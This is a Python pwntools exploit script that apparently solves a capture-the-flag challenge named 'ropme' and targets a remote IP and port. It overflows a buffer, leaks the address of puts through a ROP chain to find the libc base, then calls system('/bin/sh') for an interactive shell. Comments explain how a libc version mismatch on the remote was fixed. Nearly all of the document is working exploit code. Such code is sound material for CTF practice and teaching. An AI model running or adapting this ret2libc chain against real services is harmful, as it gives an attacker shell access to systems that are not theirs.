#!/bin/env python3
from pwn import *

exe = ELF('./ropme', checksec=False)
libc = ELF('./libc.so.6', checksec=False)

#p = process(exe.path)
p = remote('64.227.39.88', 30177)

offset = b'A'*72

rop = ROP([exe])
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
ret = rop.find_gadget(['ret'])[0]

puts_plt = exe.plt['puts']
puts_got = exe.got['puts']
main_plt = exe.symbols['main']

##################### libc leak #####################
payload = offset
payload += p64(pop_rdi)
payload += p64(puts_got)
payload += p64(puts_plt)
payload += p64(main_plt)

p.sendlineafter(b'dah?\n', payload)
puts_got_leak = u64(p.recvline()[:-1].ljust(8, b'\x00'))

log.info(f'puts_got_leak: {hex(puts_got_leak)}')
######################################################
#               ORIGINAL HACK EXPLANATION
#
# This is the original, proper, payload that works locally
# and then I ran into some problems with the remote,
# causing me to be stuck for ages. After some asking around
# someone on discord helped me. It also didn't work for him,
# causing him to use the one_gadget tool, but he ended up
# looking into it and explaining his findings and he suggested
# some things to try, which I've now done and it does prove his theory.
#
# So on the remote, they have sneakily used a slightly different version
# of libc, causing different memory addresses, so it doesn't work.
# You could have gotten lucky in picking the right download
# when searching for which libc you need on libc.kat using the puts
# and fgets addresses, as all work locally but only one does on the remote,
# which is libc6_2.23-0ubuntu9_amd64. So what we want to do is download
# that, copy it to our folder, rename it to libc.so.6 so our script
# runs the correct version of libc that is running on the remote
# so we have the correct addresses working out, and our payload works.


# We can find the libc base address and then search it to
# find the offset for commands that we want to run.
libc_base = puts_got_leak - libc.symbols['puts']
system_offset = libc.symbols['system']
binsh_offset = next(libc.search(b'/bin/sh'))
system = libc_base + system_offset
binsh = libc_base + binsh_offset

# Set payload
payload = offset + p64(pop_rdi) + p64(binsh) + p64(system)


# gdb.attach(p, gdbscript='i f')
p.sendlineafter(b'dah?\n', payload)
p.interactive()
